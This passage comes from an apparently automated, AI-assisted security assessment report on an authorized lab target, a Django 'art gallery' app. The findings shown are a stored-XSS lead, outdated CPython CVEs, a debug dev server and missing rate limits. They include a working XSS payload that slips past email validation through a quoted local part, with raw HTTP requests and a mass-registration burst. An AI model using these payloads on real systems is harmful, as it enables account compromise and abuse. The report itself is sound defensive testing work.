+    &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+    &lt;/button&gt;
+&lt;/nav&gt;
+
+&lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;div class=&quot;row justify-content-center&quot;&gt;
+        &lt;div class=&quot;col-md-6&quot;&gt;
+            &lt;h2 class=&quot;mb-4 text-center&quot;&gt;Login&lt;/h2&gt;
+            &lt;form method=&quot;post&quot; class=&quot;needs-validation&quot; novalidate&gt;
+                &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;jXgUkw8PYDhbiyqpevGnfEpGqpXFwC6SkRkkLltDjrpe88dlu5WdHUB4k8TPQDN7&quot;&gt;
+                &lt;div class=&quot;form-group&quot;&gt;
+                    &lt;label for=&quot;id_username&quot;&gt;Email:&lt;/label&gt;
+                    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;test@test.com&quot; autofocus autocapitalize=&quot;none&quot; autocomplete=&quot;username&quot; maxlength=&quot;150&quot; required id=&quot;id_username&quot;&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;form-group&quot;&gt;
+                    &lt;label for=&quot;id_password&quot;&gt;Password:&lt;/label&gt;
+                    &lt;input type=&quot;password&quot; name=&quot;password&quot; autocomplete=&quot;current-password&quot; required id=&quot;id_password&quot;&gt;
+                &lt;/div&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-block&quot;&gt;Login&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 6. [xss-stored] Stored XSS lead: step2 EmailField accepts script payload via RFC quoted local part</h3>
+<div class="kv">Screen: <code>s-0006</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Django's EmailField validation can be bypassed with an RFC quoted local part: POST email=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@x.io was accepted (302→/accounts/register/step3/, ev-mr0l9h25-3x), persisting the script payload as the account's email — whereas a bare &lt;script&gt;...&lt;/script&gt; is rejected (200, escaped re-render, ev-mr0l7ojc-3u). The app is proven to render stored profile fields unescaped (name stored-XSS + SSTI already confirmed at /accounts/preferences), so an unescaped email sink would execute. The email render sink was not located in the reachable user UI this run (preferences template renders only Name + Premium Subscriber; /admin 404s), so execution could not be confirmed — but this is a real stored-XSS lead pending an email-bearing render point (order/checkout confirmation, notification/email template, or an admin user view).</div>
+<div class="desc">The step2 EmailField (param: email) rejects a plain &lt;script&gt; payload but accepts it when wrapped in an RFC 5321 quoted local part (e.g. &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@x.io), storing the angle-bracket payload as the user's email. Because this same application renders stored profile fields without escaping (confirmed stored XSS/SSTI on the step1 name field at /accounts/preferences), the stored email payload would execute wherever the email is later rendered unescaped. No user-facing email render point was found in the mapped surface (preferences shows Name + Premium only; no Django admin), so this is recorded as a suspected lead rather than confirmed.</div>
+<div><b>Reproduction</b></div><pre>1) Complete registration step1 (name+password) to enter step2 state. 2) POST /accounts/register/step2/ with email=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@x.io (URL-encoded), valid csrfmiddlewaretoken+csrftoken cookie → 302 redirect to /accounts/register/step3/ (payload accepted/stored; ev-mr0l9h25-3x). Control: POST email=&lt;script&gt;alert(1)&lt;/script&gt; (unquoted) → 200, EmailField rejects it and the re-rendered value is HTML-escaped (ev-mr0l7ojc-3u). 3) To confirm, complete step3 and view the account's email at any unescaped render point (order/confirmation/admin view) — not located in the currently mapped surface.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0l9h25-3x</code> — <code>artifacts/s-0006/ev-mr0l9h25-3x/</code></div><div class="lbl">REQUEST</div><pre>POST /accounts/register/step2/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+csrfmiddlewaretoken=gnZyVb1gvudH3FMOGvSGwYaxI20zw143a91paJ9oDvhp4k9ROt6oyPgk7fpMsZp3&amp;email=%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%40x.io</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+content-length: 0
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:54:07 GMT
+location: /accounts/register/step3/
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY</pre></div>
+</div>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 7. [vulnerable-component] Outdated &amp; EOL CPython 3.9.2 — CVE-2023-24329 / CVE-2024-6923 / CVE-2022-45061</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> CPython 3.9.2 detected via the Server response header (`WSGIServer/0.2 CPython/3.9.2`). Python 3.9.2 was released Feb 2021; the 3.9 series reached end-of-life for security support in Oct 2025, so it now receives no further fixes, and 3.9.2 is missing ~5 years of intervening 3.9.x stdlib security patches. Notable applicable CVEs: CVE-2023-24329 (urllib.parse blank-char blocklist bypass → SSRF/host-filter bypass, fixed 3.9.17), CVE-2024-6923 (email module header injection, fixed 3.9.20), CVE-2022-45061 (IDNA quadratic-complexity CPU DoS, fixed 3.9.16). Version-based match from the banner — not exploited.</div>
+<div class="desc">The runtime advertises CPython 3.9.2 in the Server header. Python 3.9 is end-of-life (security support ended 2025-10) and 3.9.2 predates many security fixes in the 3.9 line. Confidently-applicable issues for this version: CVE-2023-24329 (High — urllib.parse fails to reject URLs with leading control/whitespace, bypassing blocklist-based SSRF/host validation; fixed in 3.9.17), CVE-2024-6923 (email.message header injection via embedded newlines; fixed in 3.9.20), CVE-2022-45061 (DoS via quadratic IDNA decoding; fixed in 3.9.16), plus CVE-2023-40217 (ssl pre-handshake data injection, fixed 3.9.18) and CVE-2024-6232 (tarfile ReDoS, fixed 3.9.20). None are direct interpreter RCE, hence medium; the SSRF-filter-bypass (CVE-2023-24329) is the most exploitable class but depends on the app using urllib blocklisting. Remediation: upgrade to a supported Python (3.12/3.13). This is a version-based component lead, not an actively confirmed exploit.
+
+[+] Also observed as &quot;Django development server (WSGIServer/0.2 runserver) exposed in production&quot;.</div>
+<div><b>Reproduction</b></div><pre>curl -sI http://target.local:32804/ → response header `Server: WSGIServer/0.2 CPython/3.9.2`. Cross-reference 3.9.2 against the Python 3.9 changelog / EOL schedule: 3.9 security support ended 2025-10; CVE-2023-24329 fixed in 3.9.17, CVE-2024-6923 in 3.9.20, CVE-2022-45061 in 3.9.16 — all post-date 3.9.2.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0m38ka-5l</code> — <code>artifacts/_/ev-mr0m38ka-5l/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 5481
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 12:17:15 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Art Gallery&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        input {
+          width: 100%;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .gallery-item {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+        .gallery-item img {
+            max-width: 100%;
+            height: auto;
+        }
+    &lt;/style&gt;
+    
+    
+&lt;/head&gt;
+&lt;body&gt;
+        
+    
+    &lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+        &lt;/button&gt;
+
+        &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarsExample01&quot;&gt;
+        &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt;
+            &lt;li class=&quot;nav-item active&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;#&quot;&gt;Home &lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+            &lt;/li&gt;
+            
+            &lt;li class=&quot;nav-item dropdown&quot;&gt;
+            &lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;dropdown01&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt;Actions&lt;/a&gt;
+            &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdown01&quot;&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/preferences&quot;&gt;My settings&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Buy Art(temporary disabled)&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Sell Art(Only Premiun Accounts)&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/logout&quot;&gt;Logout&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;/li&gt;
+            
+        &lt;/ul&gt;
+        &lt;form class=&quot;form-inline my-2 my-md-0&quot;&gt;
+            &lt;input class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot;&gt;
+        &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+    
+    &lt;div class=&quot;container&quot;&gt;
+        
+        &lt;h3 class=&quot;my-4 text-center&quot;&gt;Welcome, test!&lt;/h2&gt;
+        
+        &lt;h4 class=&quot;my-4 text-center&quot;&gt;Art objects&lt;/h1&gt;
+        &lt;div class=&quot;gallery&quot;&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r1.jpg&quot; alt=&quot;DSC02674_11&quot;&gt;
+                    &lt;h2&gt;DSC02674_11&lt;/h2&gt;
+                    &lt;p&gt;Computer Abstract Art Image&lt;br&gt;
+                        Price: &lt;b&gt;$ 8.5&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r2.jpg&quot; alt=&quot;Urban street-art&quot;&gt;
+                    &lt;h2&gt;Urban street-art&lt;/h2&gt;
+                    &lt;p&gt;graffiti on a wooden construction-wall on Plantage Muidergracht&lt;br&gt;
+                        Price: &lt;b&gt;$ 5.6&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r3.jpg&quot; alt=&quot;Abstract-9974&quot;&gt;
+                    &lt;h2&gt;Abstract-9974&lt;/h2&gt;
+                    &lt;p&gt;Abstract Art Image&lt;br&gt;
+                        Price: &lt;b&gt;$ 6.5&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r4.jpg&quot; alt=&quot;Art 235&quot;&gt;
+                    &lt;h2&gt;Art 235&lt;/h2&gt;
+                    &lt;p&gt;Composite Image&lt;br&gt;
+                        Price: &lt;b&gt;$ 4.8&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r5.jpg&quot; alt=&quot;Radiographic Image&quot;&gt;
+                    &lt;h2&gt;Radiographic Image&lt;/h2&gt;
+                    &lt;p&gt;African Songye Power Figure in the collection of the Indianapolis Museum of Art&lt;br&gt;
+                        Price: &lt;b&gt;$ 11.3&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r6.jpg&quot; alt=&quot;Abstract00BO&quot;&gt;
+                    &lt;h2&gt;Abstract00BO&lt;/h2&gt;
+                    &lt;p&gt;BTerryCompton Abstract Art Image&lt;br&gt;
+                        Price: &lt;b&gt;$ 8.4&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r7.jpg&quot; alt=&quot;Aliens laughing&quot;&gt;
+                    &lt;h2&gt;Aliens laughing&lt;/h2&gt;
+                    &lt;p&gt;Young gray aliens reading books, laughing&lt;br&gt;
+                        Price: &lt;b&gt;$ 6.5&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r8.jpg&quot; alt=&quot;Flower #56&quot;&gt;
+                    &lt;h2&gt;Flower #56&lt;/h2&gt;
+                    &lt;p&gt;134 flowers Sea Lavender Art&lt;br&gt;
+                        Price: &lt;b&gt;$ 9.0&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+                &lt;div class=&quot;gallery-item&quot;&gt;
+                    &lt;img src=&quot;/static/img/r9.jpg&quot; alt=&quot;White Wolves&quot;&gt;
+                    &lt;h2&gt;White Wolves&lt;/h2&gt;
+                    &lt;p&gt;CPM Art Challenge Photo White Wolves, 2013&lt;br&gt;
+                        Price: &lt;b&gt;$ 7.3&lt;/b&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0m4r9d-5t</code> — <code>artifacts/_/ev-mr0m4r9d-5t/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 2347
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 12:18:26 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+  &lt;title&gt;Page not found at /admin/&lt;/title&gt;
+  &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;
+  &lt;style type=&quot;text/css&quot;&gt;
+    html * { padding:0; margin:0; }
+    body * { padding:10px 20px; }
+    body * * { padding:0; }
+    body { font:small sans-serif; background:#eee; color:#000; }
+    body&gt;div { border-bottom:1px solid #ddd; }
+    h1 { font-weight:normal; margin-bottom:.4em; }
+    h1 span { font-size:60%; color:#666; font-weight:normal; }
+    table { border:none; border-collapse: collapse; width:100%; }
+    td, th { vertical-align:top; padding:2px 3px; }
+    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
+    #info { background:#f6f6f6; }
+    #info ol { margin: 0.5em 4em; }
+    #info ol li { font-family: monospace; }
+    #summary { background: #ffc; }
+    #explanation { background:#eee; border-bottom: 0px none; }
+    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;summary&quot;&gt;
+    &lt;h1&gt;Page not found &lt;span&gt;(404)&lt;/span&gt;&lt;/h1&gt;
+    
+    &lt;table class=&quot;meta&quot;&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request Method:&lt;/th&gt;
+        &lt;td&gt;GET&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request URL:&lt;/th&gt;
+        &lt;td&gt;http://target.local:32804/admin/&lt;/td&gt;
+      &lt;/tr&gt;
+      
+    &lt;/table&gt;
+  &lt;/div&gt;
+  &lt;div id=&quot;info&quot;&gt;
+    
+      &lt;p&gt;
+      Using the URLconf defined in &lt;code&gt;ssti_debug_art_gallery.urls&lt;/code&gt;,
+      Django tried these URL patterns, in this order:
+      &lt;/p&gt;
+      &lt;ol&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                
+                
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                ^static/(?P&amp;lt;path&amp;gt;.*)$
+                
+            
+          &lt;/li&gt;
+        
+      &lt;/ol&gt;
+      &lt;p&gt;
+        
+          The current path, &lt;code&gt;admin/&lt;/code&gt;,
+        
+        didn’t match any of these.
+      &lt;/p&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div id=&quot;explanation&quot;&gt;
+    &lt;p&gt;
+      You’re seeing this error because you have &lt;code&gt;DEBUG = True&lt;/code&gt; in
+      your Django settings file. Change that to &lt;code&gt;False&lt;/code&gt;, and Django
+      will display a standard 404 page.
+    &lt;/p&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-8">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#f57c00">MEDIUM</span> 8. [vulnerable-component] Django development server (runserver / wsgiref) used in production</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Server header `WSGIServer/0.2 CPython/3.9.2` is the signature of Python's wsgiref simple_server — Django's `manage.py runserver` dev server — and it serves `/static/admin/css/base.css` directly (200). Django docs explicitly forbid this for production (&quot;not gone through security audits or performance tests&quot;): single-threaded/blocking (trivially DoS-able), no hardening. Corroborated by the DEBUG=True technical 404 page (project module `ssti_debug_art_gallery`, URLconf disclosed). Insecure-by-design component running as the production server — deployment-based observation, not a single exploited request.</div>
+<div class="desc">Distinct from the outdated-interpreter issue (f-008): here the *component choice* is the weakness. The app is fronted by Django's built-in development server (wsgiref `WSGIServer/0.2`) rather than a hardened WSGI/ASGI stack (gunicorn/uWSGI + nginx). The dev server is unsupported for production by the Django project — no security review, single-threaded (a few slow/concurrent requests stall it → DoS), and it is paired here with DEBUG=True (the Django 404 debug page leaks the URLconf and project module; a 500 would expose full tracebacks, settings, and potentially SECRET_KEY). Remediation: run a production WSGI/ASGI server with DEBUG=False and explicit ALLOWED_HOSTS, and serve static via the web server/CDN. The DEBUG info-disclosure may already be captured in per-screen diagnosis; this is the component/deployment lead for A06.</div>
+<div><b>Reproduction</b></div><pre>1) curl -sI http://target.local:32804/ → `Server: WSGIServer/0.2 CPython/3.9.2` (wsgiref = Django runserver). 2) GET /static/admin/css/base.css → 200 (runserver serving static). 3) GET /admin/ → Django DEBUG=True &quot;Page not found (404)&quot; page disclosing the URLconf and project module `ssti_debug_art_gallery`.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0m4r9d-5t</code> — <code>artifacts/_/ev-mr0m4r9d-5t/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 2347
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 12:18:26 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+  &lt;title&gt;Page not found at /admin/&lt;/title&gt;
+  &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;
+  &lt;style type=&quot;text/css&quot;&gt;
+    html * { padding:0; margin:0; }
+    body * { padding:10px 20px; }
+    body * * { padding:0; }
+    body { font:small sans-serif; background:#eee; color:#000; }
+    body&gt;div { border-bottom:1px solid #ddd; }
+    h1 { font-weight:normal; margin-bottom:.4em; }
+    h1 span { font-size:60%; color:#666; font-weight:normal; }
+    table { border:none; border-collapse: collapse; width:100%; }
+    td, th { vertical-align:top; padding:2px 3px; }
+    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
+    #info { background:#f6f6f6; }
+    #info ol { margin: 0.5em 4em; }
+    #info ol li { font-family: monospace; }
+    #summary { background: #ffc; }
+    #explanation { background:#eee; border-bottom: 0px none; }
+    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;summary&quot;&gt;
+    &lt;h1&gt;Page not found &lt;span&gt;(404)&lt;/span&gt;&lt;/h1&gt;
+    
+    &lt;table class=&quot;meta&quot;&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request Method:&lt;/th&gt;
+        &lt;td&gt;GET&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request URL:&lt;/th&gt;
+        &lt;td&gt;http://target.local:32804/admin/&lt;/td&gt;
+      &lt;/tr&gt;
+      
+    &lt;/table&gt;
+  &lt;/div&gt;
+  &lt;div id=&quot;info&quot;&gt;
+    
+      &lt;p&gt;
+      Using the URLconf defined in &lt;code&gt;ssti_debug_art_gallery.urls&lt;/code&gt;,
+      Django tried these URL patterns, in this order:
+      &lt;/p&gt;
+      &lt;ol&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                
+                
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                ^static/(?P&amp;lt;path&amp;gt;.*)$
+                
+            
+          &lt;/li&gt;
+        
+      &lt;/ol&gt;
+      &lt;p&gt;
+        
+          The current path, &lt;code&gt;admin/&lt;/code&gt;,
+        
+        didn’t match any of these.
+      &lt;/p&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div id=&quot;explanation&quot;&gt;
+    &lt;p&gt;
+      You’re seeing this error because you have &lt;code&gt;DEBUG = True&lt;/code&gt; in
+      your Django settings file. Change that to &lt;code&gt;False&lt;/code&gt;, and Django
+      will display a standard 404 page.
+    &lt;/p&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-9">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#c9a227">LOW</span> 9. [rate-limit] No rate limiting / anti-automation on multi-step registration (mass account creation)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> 6 consecutive registration POSTs (plus ~5 earlier full registrations) all succeeded with HTTP 302 and zero throttling, CAPTCHA, or lockout — the registration endpoint has no anti-automation, enabling automated mass account creation.</div>
+<div class="desc">The registration flow (/accounts/register/step1 → step2 → step3) enforces no rate limiting, CAPTCHA, or lockout. A burst of 6 back-to-back POSTs to step1 all returned 302 success (plus numerous additional full registrations completed during this assessment), with no 429, no challenge, and no slowdown. This permits automated mass account creation / resource exhaustion and amplifies any downstream abuse (e.g. seeding many accounts carrying the stored-XSS display-name payload). Recorded as suspected because the class cannot be expressed with the confirmed evidence structure (a rate-limit weakness has no failing negative control — every request succeeds); the observation itself is directly demonstrated.</div>
+<div><b>Reproduction</b></div><pre>Send N rapid POSTs to /accounts/register/step1/ (valid csrfmiddlewaretoken + csrftoken cookie, name+password). All return 302 → step2 with no throttling, CAPTCHA, or lockout. Observed 6 consecutive successes in ~10s (ev-mr0keiih-21 … ev-mr0keq0j-26) on top of ~5 prior full registrations.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0keq0j-26</code> — <code>artifacts/s-0002/ev-mr0keq0j-26/</code></div><div class="lbl">REQUEST</div><pre>POST /accounts/register/step1/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+
+csrfmiddlewaretoken=XcJmvw9hY46ySs4dO5aX41o3Irr6muvVY6NMWlu5jSeBI2R94FqNwhArCangGvca&amp;name=RL_burst_6&amp;password=TestPass123!</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+content-length: 0
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:30:12 GMT
+location: /accounts/register/step2/
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY</pre></div>
+</div>
+</body></html>
